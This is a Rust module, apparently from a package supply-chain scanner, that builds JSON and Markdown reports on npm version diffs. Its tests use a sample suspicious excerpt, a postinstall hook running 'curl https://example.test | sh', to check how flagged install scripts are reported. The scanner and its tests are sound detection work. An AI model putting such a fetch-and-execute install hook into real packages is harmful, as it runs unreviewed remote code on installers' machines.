use std::fmt::Write as _;
use std::fs;
use std::io;
use std::path::{Path, PathBuf};

use serde::Serialize;

use crate::diff::{DiffSummary, SuspiciousExcerpt};
use crate::registry::Ecosystem;
use crate::review::{Confidence, ReviewOutput, ReviewVerdict};
use crate::signals::Signal;
use crate::state::StateLayout;

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct JsonReport {
    pub status: String,
    pub ecosystem: String,
    pub package: String,
    pub old_version: String,
    pub new_version: String,
    pub summary: JsonDiffSummary,
    pub manifest_diff: Option<String>,
    pub interesting_files: Vec<JsonInterestingFile>,
    pub verdict: String,
    pub confidence: String,
    pub reasons: Vec<String>,
    pub focus_files: Vec<String>,
    pub review_failure: Option<String>,
}

#[derive(Debug, Clone)]
pub struct JsonReportWriter<'a> {
    state_layout: &'a StateLayout,
}

#[derive(Debug, Clone)]
pub struct MarkdownReportWriter<'a> {
    state_layout: &'a StateLayout,
}

#[derive(Debug, Clone)]
pub struct JsonReportInput<'a> {
    pub status: &'a str,
    pub ecosystem: Ecosystem,
    pub package: &'a str,
    pub old_version: &'a str,
    pub new_version: &'a str,
    pub diff: &'a DiffSummary,
    pub signals: &'a [Signal],
    pub manifest_diff: Option<String>,
    pub interesting_files: &'a [SuspiciousExcerpt],
    pub review: &'a ReviewOutput,
}

pub type MarkdownReportInput<'a> = JsonReportInput<'a>;

impl<'a> JsonReportWriter<'a> {
    pub fn new(state_layout: &'a StateLayout) -> Self {
        Self { state_layout }
    }

    pub fn path_for(
        &self,
        ecosystem: Ecosystem,
        package: &str,
        old_version: &str,
        new_version: &str,
    ) -> PathBuf {
        self.state_layout.reports_dir().join(report_relative_path(
            ecosystem.as_str(),
            package,
            old_version,
            new_version,
            "json",
        ))
    }

    pub fn write_report(&self, report: &JsonReport) -> Result<PathBuf, ReportError> {
        let path = self.state_layout.reports_dir().join(report.relative_path());
        report.write_to_path(&path)?;
        Ok(path)
    }

    pub fn write_analysis(&self, input: JsonReportInput<'_>) -> Result<PathBuf, ReportError> {
        let report = JsonReport::from_analysis(input);
        self.write_report(&report)
    }
}

impl JsonReport {
    pub fn from_analysis(input: JsonReportInput<'_>) -> Self {
        Self {
            status: input.status.to_string(),
            ecosystem: input.ecosystem.as_str().to_string(),
            package: input.package.to_string(),
            old_version: input.old_version.to_string(),
            new_version: input.new_version.to_string(),
            summary: JsonDiffSummary::from_diff_and_signals(input.diff, input.signals),
            manifest_diff: input.manifest_diff,
            interesting_files: input
                .interesting_files
                .iter()
                .cloned()
                .map(JsonInterestingFile::from)
                .collect(),
            verdict: review_verdict_label(&input.review.verdict).to_string(),
            confidence: confidence_label(&input.review.confidence).to_string(),
            reasons: input.review.reasons.clone(),
            focus_files: input.review.focus_files.clone(),
            review_failure: input.review.failure_reason.clone(),
        }
    }

    pub fn relative_path(&self) -> PathBuf {
        report_relative_path(
            &self.ecosystem,
            &self.package,
            &self.old_version,
            &self.new_version,
            "json",
        )
    }

    pub fn write_to_reports_dir(&self, state_layout: &StateLayout) -> Result<PathBuf, ReportError> {
        JsonReportWriter::new(state_layout).write_report(self)
    }

    pub fn write_to_path(&self, path: impl AsRef<Path>) -> Result<(), ReportError> {
        let path = path.as_ref();
        if let Some(parent) = path.parent() {
            fs::create_dir_all(parent).map_err(|source| ReportError::Io {
                path: parent.to_path_buf(),
                source,
            })?;
        }

        let json = serde_json::to_string_pretty(self).map_err(ReportError::Serialize)?;
        fs::write(path, format!("{json}\n")).map_err(|source| ReportError::Io {
            path: path.to_path_buf(),
            source,
        })?;
        Ok(())
    }
}

impl<'a> MarkdownReportWriter<'a> {
    pub fn new(state_layout: &'a StateLayout) -> Self {
        Self { state_layout }
    }

    pub fn path_for(
        &self,
        ecosystem: Ecosystem,
        package: &str,
        old_version: &str,
        new_version: &str,
    ) -> PathBuf {
        self.state_layout.reports_dir().join(report_relative_path(
            ecosystem.as_str(),
            package,
            old_version,
            new_version,
            "md",
        ))
    }

    pub fn write_report(
        &self,
        ecosystem: Ecosystem,
        package: &str,
        old_version: &str,
        new_version: &str,
        report: &MarkdownReport,
    ) -> Result<PathBuf, ReportError> {
        let path = self.path_for(ecosystem, package, old_version, new_version);
        report.write_to_path(&path)?;
        Ok(path)
    }

    pub fn write_analysis(&self, input: MarkdownReportInput<'_>) -> Result<PathBuf, ReportError> {
        let path = self.path_for(
            input.ecosystem,
            input.package,
            input.old_version,
            input.new_version,
        );
        let report = MarkdownReport::from_analysis(input);
        report.write_to_path(&path)?;
        Ok(path)
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct JsonDiffSummary {
    pub files_added: usize,
    pub files_removed: usize,
    pub files_changed: usize,
    pub changed_paths: Vec<String>,
    pub added_paths: Vec<String>,
    pub removed_paths: Vec<String>,
    pub modified_paths: Vec<String>,
    pub signals: Vec<String>,
}

impl JsonDiffSummary {
    pub fn from_diff_and_signals(diff: &DiffSummary, signals: &[Signal]) -> Self {
        Self {
            files_added: diff.files_added,
            files_removed: diff.files_removed,
            files_changed: diff.files_changed,
            changed_paths: diff.changed_paths.clone(),
            added_paths: diff.added_paths.clone(),
            removed_paths: diff.removed_paths.clone(),
            modified_paths: diff.modified_paths.clone(),
            signals: signals
                .iter()
                .copied()
                .map(signal_label)
                .map(str::to_string)
                .collect(),
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct JsonInterestingFile {
    pub path: String,
    pub reason: String,
    pub excerpt: String,
}

impl From<SuspiciousExcerpt> for JsonInterestingFile {
    fn from(value: SuspiciousExcerpt) -> Self {
        Self {
            path: value.path,
            reason: value.reason,
            excerpt: value.excerpt,
        }
    }
}

#[derive(Debug)]
pub enum ReportError {
    Io { path: PathBuf, source: io::Error },
    Serialize(serde_json::Error),
}

impl std::fmt::Display for ReportError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Io { path, source } => {
                write!(f, "failed to write report {}: {source}", path.display())
            }
            Self::Serialize(source) => write!(f, "failed to serialize report json: {source}"),
        }
    }
}

impl std::error::Error for ReportError {
    fn source(&self) -> Option<&(dyn std::error::Error + 'static)> {
        match self {
            Self::Io { source, .. } => Some(source),
            Self::Serialize(source) => Some(source),
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct MarkdownReport {
    pub title: String,
    pub body: String,
}

impl MarkdownReport {
    pub fn from_analysis(input: MarkdownReportInput<'_>) -> Self {
        let mut body = String::new();
        let summary = JsonDiffSummary::from_diff_and_signals(input.diff, input.signals);
        let verdict = review_verdict_label(&input.review.verdict);
        let confidence = confidence_label(&input.review.confidence);
        let title = format!(
            "{} {} → {} ({})",
            input.package,
            input.old_version,
            input.new_version,
            input.ecosystem.as_str()
        );

        let _ = writeln!(&mut body, "# {title}");
        let _ = writeln!(&mut body);
        let _ = writeln!(&mut body, "- Status: `{}`", input.status);
        let _ = writeln!(&mut body, "- Verdict: `{verdict}`");
        let _ = writeln!(&mut body, "- Confidence: `{confidence}`");
        if let Some(reason) = &input.review.failure_reason {
            let _ = writeln!(&mut body, "- Review failure: `{}`", reason);
        }
        let _ = writeln!(&mut body);

        let _ = writeln!(&mut body, "## Diff summary");
        let _ = writeln!(&mut body);
        let _ = writeln!(&mut body, "- Files added: {}", summary.files_added);
        let _ = writeln!(&mut body, "- Files removed: {}", summary.files_removed);
        let _ = writeln!(&mut body, "- Files changed: {}", summary.files_changed);
        write_string_list(&mut body, "Signals", &summary.signals);
        write_string_list(&mut body, "Changed paths", &summary.changed_paths);
        let _ = writeln!(&mut body);

        let _ = writeln!(&mut body, "## Review");
        let _ = writeln!(&mut body);
        write_string_list(&mut body, "Reasons", &input.review.reasons);
        write_string_list(&mut body, "Focus files", &input.review.focus_files);
        let _ = writeln!(&mut body);

        if let Some(manifest_diff) = input.manifest_diff {
            let _ = writeln!(&mut body, "## Manifest diff");
            let _ = writeln!(&mut body);
            let _ = writeln!(&mut body, "```diff");
            let _ = write!(&mut body, "{manifest_diff}");
            if !manifest_diff.ends_with('\n') {
                let _ = writeln!(&mut body);
            }
            let _ = writeln!(&mut body, "```");
            let _ = writeln!(&mut body);
        }

        if !input.interesting_files.is_empty() {
            let _ = writeln!(&mut body, "## Interesting files");
            let _ = writeln!(&mut body);
            for file in input.interesting_files {
                let _ = writeln!(&mut body, "### `{}`", file.path);
                let _ = writeln!(&mut body);
                let _ = writeln!(&mut body, "- Reason: {}", file.reason);
                let _ = writeln!(&mut body);
                let _ = writeln!(&mut body, "```text");
                let _ = writeln!(&mut body, "{}", file.excerpt);
                let _ = writeln!(&mut body, "```");
                let _ = writeln!(&mut body);
            }
        }

        Self { title, body }
    }

    pub fn write_to_reports_dir(
        &self,
        state_layout: &StateLayout,
        ecosystem: Ecosystem,
        package: &str,
        old_version: &str,
        new_version: &str,
    ) -> Result<PathBuf, ReportError> {
        MarkdownReportWriter::new(state_layout).write_report(
            ecosystem,
            package,
            old_version,
            new_version,
            self,
        )
    }

    pub fn write_to_path(&self, path: impl AsRef<Path>) -> Result<(), ReportError> {
        let path = path.as_ref();
        if let Some(parent) = path.parent() {
            fs::create_dir_all(parent).map_err(|source| ReportError::Io {
                path: parent.to_path_buf(),
                source,
            })?;
        }

        let mut markdown = String::new();
        markdown.push_str(&self.body);
        if !markdown.ends_with('\n') {
            markdown.push('\n');
        }
        fs::write(path, markdown).map_err(|source| ReportError::Io {
            path: path.to_path_buf(),
            source,
        })?;
        Ok(())
    }
}

fn report_relative_path(
    ecosystem: &str,
    package: &str,
    old_version: &str,
    new_version: &str,
    extension: &str,
) -> PathBuf {
    PathBuf::from(ecosystem)
        .join(sanitize_path_component(package))
        .join(format!("{old_version}_to_{new_version}.{extension}"))
}

fn review_verdict_label(verdict: &ReviewVerdict) -> &'static str {
    match verdict {
        ReviewVerdict::Benign => "benign",
        ReviewVerdict::Suspicious => "suspicious",
        ReviewVerdict::NeedsReview => "needs-review",
    }
}

fn confidence_label(confidence: &Confidence) -> &'static str {
    match confidence {
        Confidence::Low => "low",
        Confidence::Medium => "medium",
        Confidence::High => "high",
    }
}

fn signal_label(signal: Signal) -> &'static str {
    signal.as_str()
}

fn write_string_list(body: &mut String, label: &str, items: &[String]) {
    if items.is_empty() {
        let _ = writeln!(body, "- {label}: (none)");
        return;
    }

    let _ = writeln!(body, "- {label}:");
    for item in items {
        let _ = writeln!(body, "  - `{item}`");
    }
}

fn sanitize_path_component(component: &str) -> String {
    let mut sanitized = String::with_capacity(component.len());

    for byte in component.bytes() {
        match byte {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'.' | b'_' | b'-' => {
                sanitized.push(byte as char)
            }
            _ => sanitized.push_str(&format!("~{byte:02X}")),
        }
    }

    if sanitized.is_empty() {
        "_".to_string()
    } else {
        sanitized
    }
}

#[cfg(test)]
mod tests {
    use std::fs;
    use std::path::{Path, PathBuf};
    use std::time::{SystemTime, UNIX_EPOCH};

    use serde_json::Value;

    use crate::config::ReviewProvider;
    use crate::diff::{DiffSummary, ManifestDiff, SuspiciousExcerpt};
    use crate::inventory::InventorySummary;
    use crate::registry::Ecosystem;
    use crate::review::{
        Confidence, ReviewBackend, ReviewInput, ReviewInputAnalysis, ReviewOutput, ReviewVerdict,
    };
    use crate::signals::{Signal, SignalAnalysis};
    use crate::state::StateLayout;

    use super::{
        JsonReport, JsonReportInput, JsonReportWriter, MarkdownReport, MarkdownReportWriter,
    };

    #[test]
    fn builds_machine_readable_json_report() {
        let diff = DiffSummary {
            files_added: 1,
            files_removed: 1,
            files_changed: 2,
            changed_paths: vec![
                "package.json".to_string(),
                "README.md".to_string(),
                "dist/index.js".to_string(),
                "obsolete.js".to_string(),
            ],
            added_paths: vec!["dist/index.js".to_string()],
            removed_paths: vec!["obsolete.js".to_string()],
            modified_paths: vec!["package.json".to_string(), "README.md".to_string()],
        };
        let interesting_files = [SuspiciousExcerpt {
            path: "package.json".to_string(),
            reason: "install script changed".to_string(),
            excerpt: "   4:   \"postinstall\": \"curl https://example.test | sh\"".to_string(),
        }];
        let review = ReviewOutput {
            verdict: ReviewVerdict::Suspicious,
            confidence: Confidence::High,
            reasons: vec!["new install script".to_string()],
            focus_files: vec!["package.json".to_string()],
            failure_reason: None,
        };
        let report = JsonReport::from_analysis(JsonReportInput {
            status: "ok",
            ecosystem: Ecosystem::Npm,
            package: "react",
            old_version: "19.0.0",
            new_version: "19.1.0",
            diff: &diff,
            signals: &[Signal::DependencyAdded, Signal::InstallScriptAdded],
            manifest_diff: Some("--- old/package.json\n+++ new/package.json\n".to_string()),
            interesting_files: &interesting_files,
            review: &review,
        });

        assert_eq!(
            report.relative_path(),
            PathBuf::from("npm/react/19.0.0_to_19.1.0.json")
        );
        assert_eq!(
            report.summary.signals,
            vec!["dependency-added", "install-script-added"]
        );
        assert_eq!(report.verdict, "suspicious");
        assert_eq!(report.confidence, "high");
    }

    #[test]
    fn writer_builds_scoped_package_paths_under_reports_dir() {
        let repo_root = TestDir::new("reports-paths");
        let state_layout =
            StateLayout::from_repo_root(repo_root.path()).expect("state layout should build");
        let writer = JsonReportWriter::new(&state_layout);

        assert_eq!(
            writer.path_for(Ecosystem::Npm, "@types/node", "20.0.0", "20.1.0"),
            state_layout
                .reports_dir()
                .join("npm")
                .join("~40types~2Fnode")
                .join("20.0.0_to_20.1.0.json")
        );
    }

    #[test]
    fn writes_package_json_report_under_state_layout() {
        let repo_root = TestDir::new("reports-layout");
        let state_layout =
            StateLayout::from_repo_root(repo_root.path()).expect("state layout should build");
        let diff = DiffSummary::default();
        let review = ReviewOutput {
            verdict: ReviewVerdict::NeedsReview,
            confidence: Confidence::Medium,
            reasons: vec!["entrypoint changed".to_string()],
            focus_files: vec!["package.json".to_string()],
            failure_reason: Some("review backend timed out".to_string()),
        };
        let writer = JsonReportWriter::new(&state_layout);

        let path = writer
            .write_analysis(JsonReportInput {
                status: "ok",
                ecosystem: Ecosystem::Npm,
                package: "@types/node",
                old_version: "20.0.0",
                new_version: "20.1.0",
                diff: &diff,
                signals: &[Signal::EntrypointChanged],
                manifest_diff: None,
                interesting_files: &[],
                review: &review,
            })
            .expect("report should be written");
        let json = fs::read_to_string(&path).expect("report file should exist");
        let value: Value = serde_json::from_str(&json).expect("report json should parse");

        assert_eq!(
            path,
            state_layout
                .reports_dir()
                .join("npm")
                .join("~40types~2Fnode")
                .join("20.0.0_to_20.1.0.json")
        );
        assert_eq!(value["package"], "@types/node");
        assert_eq!(value["summary"]["signals"][0], "entrypoint-changed");
        assert_eq!(value["verdict"], "needs-review");
        assert_eq!(value["review_failure"], "review backend timed out");
    }

    #[test]
    fn builds_human_readable_markdown_report() {
        let diff = DiffSummary {
            files_added: 1,
            files_removed: 0,
            files_changed: 2,
            changed_paths: vec!["package.json".to_string(), "dist/index.js".to_string()],
            added_paths: vec!["dist/index.js".to_string()],
            removed_paths: vec![],
            modified_paths: vec!["package.json".to_string()],
        };
        let interesting_files = [SuspiciousExcerpt {
            path: "package.json".to_string(),
            reason: "install script changed".to_string(),
            excerpt: "4: \"postinstall\": \"curl https://example.test | sh\"".to_string(),
        }];
        let review = ReviewOutput {
            verdict: ReviewVerdict::Suspicious,
            confidence: Confidence::High,
            reasons: vec!["new install script".to_string()],
            focus_files: vec!["package.json".to_string()],
            failure_reason: Some("review backend timed out".to_string()),
        };

        let report = MarkdownReport::from_analysis(JsonReportInput {
            status: "human-review-required",
            ecosystem: Ecosystem::Npm,
            package: "react",
            old_version: "19.0.0",
            new_version: "19.1.0",
            diff: &diff,
            signals: &[Signal::InstallScriptAdded],
            manifest_diff: Some("--- old/package.json\n+++ new/package.json\n".to_string()),
            interesting_files: &interesting_files,
            review: &review,
        });

        assert_eq!(report.title, "react 19.0.0 → 19.1.0 (npm)");
        assert!(report.body.contains("# react 19.0.0 → 19.1.0 (npm)"));
        assert!(report.body.contains("- Status: `human-review-required`"));
        assert!(report.body.contains("- Verdict: `suspicious`"));
        assert!(report
            .body
            .contains("- Review failure: `review backend timed out`"));
        assert!(report.body.contains("## Manifest diff"));
        assert!(report.body.contains("```diff"));
        assert!(report.body.contains("## Interesting files"));
        assert!(report.body.contains("### `package.json`"));
    }

    #[test]
    fn writes_package_markdown_report_under_state_layout() {
        let repo_root = TestDir::new("reports-markdown-layout");
        let state_layout =
            StateLayout::from_repo_root(repo_root.path()).expect("state layout should build");
        let diff = DiffSummary::default();
        let review = ReviewOutput {
            verdict: ReviewVerdict::Benign,
            confidence: Confidence::Low,
            reasons: vec!["no suspicious changes found".to_string()],
            focus_files: vec![],
            failure_reason: None,
        };
        let writer = MarkdownReportWriter::new(&state_layout);

        assert_eq!(
            writer.path_for(Ecosystem::Npm, "@types/node", "20.0.0", "20.1.0"),
            state_layout
                .reports_dir()
                .join("npm")
                .join("~40types~2Fnode")
                .join("20.0.0_to_20.1.0.md")
        );

        let path = writer
            .write_analysis(JsonReportInput {
                status: "ok",
                ecosystem: Ecosystem::Npm,
                package: "@types/node",
                old_version: "20.0.0",
                new_version: "20.1.0",
                diff: &diff,
                signals: &[],
                manifest_diff: None,
                interesting_files: &[],
                review: &review,
            })
            .expect("markdown report should be written");
        let markdown = fs::read_to_string(&path).expect("markdown report should exist");

        assert_eq!(
            path,
            state_layout
                .reports_dir()
                .join("npm")
                .join("~40types~2Fnode")
                .join("20.0.0_to_20.1.0.md")
        );
        assert!(markdown.contains("# @types/node 20.0.0 → 20.1.0 (npm)"));
        assert!(markdown.contains("- Verdict: `benign`"));
        assert!(markdown.contains("- Signals: (none)"));
    }

    #[test]
    fn end_to_end_fixture_pipeline_builds_review_input_and_reports() {
        let old_root = fixture_path("e2e/npm/react/19.0.0");
        let new_root = fixture_path("e2e/npm/react/19.1.0");
        let old_inventory =
            InventorySummary::collect(&old_root).expect("old fixture inventory should load");
        let new_inventory =
            InventorySummary::collect(&new_root).expect("new fixture inventory should load");
        let diff = DiffSummary::between(&old_inventory, &new_inventory);
        let manifest_diff = ManifestDiff::extract(Ecosystem::Npm, &old_root, &new_root, &diff)
            .expect("manifest diff should extract")
            .expect("fixture should contain a manifest diff");
        let signal_analysis = SignalAnalysis::analyze_v0(
            Ecosystem::Npm,
            &old_root,
            &new_root,
            &old_inventory,
            &new_inventory,
            &diff,
        )
        .expect("signal analysis should succeed");
        let review_input = ReviewInput::from_analysis(
            ReviewInputAnalysis {
                ecosystem: Ecosystem::Npm.as_str().to_string(),
                package: "react".to_string(),
                old_version: "19.0.0".to_string(),
                new_version: "19.1.0".to_string(),
                manifest_diff: Some(manifest_diff.diff.clone()),
                interesting_files: signal_analysis.interesting_files.clone(),
            },
            &diff,
            &signal_analysis.signals,
        );
        let review_backend = ReviewBackend::from_provider(ReviewProvider::None)
            .expect("none backend should be supported");
        let decision = review_backend.review_fail_closed(&review_input);

        assert_eq!(diff.files_added, 4);
        assert_eq!(diff.files_removed, 1);
        assert_eq!(diff.files_changed, 1);
        assert!(manifest_diff.diff.contains("postinstall"));
        assert!(signal_analysis.signals.contains(&Signal::DependencyAdded));
        assert!(signal_analysis
            .signals
            .contains(&Signal::InstallScriptAdded));
        assert!(signal_analysis.signals.contains(&Signal::EntrypointChanged));
        assert!(signal_analysis
            .signals
            .contains(&Signal::NetworkProcessEnvAccessAdded));
        assert!(review_input
            .interesting_files
            .iter()
            .any(|excerpt| excerpt.path == "package.json"));
        assert!(review_input
            .interesting_files
            .iter()
            .any(|excerpt| excerpt.path == "scripts/postinstall.js"));
        assert_eq!(decision.status, "ok");
        assert_eq!(decision.output.verdict, ReviewVerdict::NeedsReview);
        assert!(decision
            .output
            .reasons
            .iter()
            .any(|reason| reason.contains("provider=none")));

        let repo_root = TestDir::new("reports-e2e");
        let state_layout =
            StateLayout::from_repo_root(repo_root.path()).expect("state layout should build");
        let json_path = JsonReportWriter::new(&state_layout)
            .write_analysis(JsonReportInput {
                status: &decision.status,
                ecosystem: Ecosystem::Npm,
                package: "react",
                old_version: "19.0.0",
                new_version: "19.1.0",
                diff: &diff,
                signals: &signal_analysis.signals,
                manifest_diff: review_input.manifest_diff.clone(),
                interesting_files: &review_input.interesting_files,
                review: &decision.output,
            })
            .expect("json report should be written");
        let markdown_path = MarkdownReportWriter::new(&state_layout)
            .write_analysis(JsonReportInput {
                status: &decision.status,
                ecosystem: Ecosystem::Npm,
                package: "react",
                old_version: "19.0.0",
                new_version: "19.1.0",
                diff: &diff,
                signals: &signal_analysis.signals,
                manifest_diff: review_input.manifest_diff.clone(),
                interesting_files: &review_input.interesting_files,
                review: &decision.output,
            })
            .expect("markdown report should be written");

        let json = fs::read_to_string(&json_path).expect("json report should exist");
        let json_value: Value = serde_json::from_str(&json).expect("json report should parse");
        let markdown = fs::read_to_string(&markdown_path).expect("markdown report should exist");

        assert_eq!(
            json_path,
            state_layout
                .reports_dir()
                .join("npm/react/19.0.0_to_19.1.0.json")
        );
        assert_eq!(
            markdown_path,
            state_layout
                .reports_dir()
                .join("npm/react/19.0.0_to_19.1.0.md")
        );
        assert_eq!(json_value["package"], "react");
        assert_eq!(json_value["summary"]["files_added"], 4);
        assert!(json.contains("network-process-env-access-added"));
        assert!(json.contains("scripts/postinstall.js"));
        assert!(markdown.contains("# react 19.0.0 → 19.1.0 (npm)"));
        assert!(markdown.contains("- Verdict: `needs-review`"));
        assert!(markdown.contains("### `scripts/postinstall.js`"));
        assert!(markdown.contains("## Manifest diff"));
    }

    fn fixture_path(relative: &str) -> PathBuf {
        PathBuf::from(env!("CARGO_MANIFEST_DIR"))
            .join("tests/fixtures")
            .join(relative)
    }

    struct TestDir {
        path: PathBuf,
    }

    impl TestDir {
        fn new(label: &str) -> Self {
            let unique = SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .expect("time should move forward")
                .as_nanos();
            let path = std::env::temp_dir().join(format!("pincushion-report-{label}-{unique}"));
            fs::create_dir_all(&path).expect("temp dir should be created");
            Self { path }
        }

        fn path(&self) -> &Path {
            &self.path
        }
    }

    impl Drop for TestDir {
        fn drop(&mut self) {
            let _ = fs::remove_dir_all(&self.path);
        }
    }
}
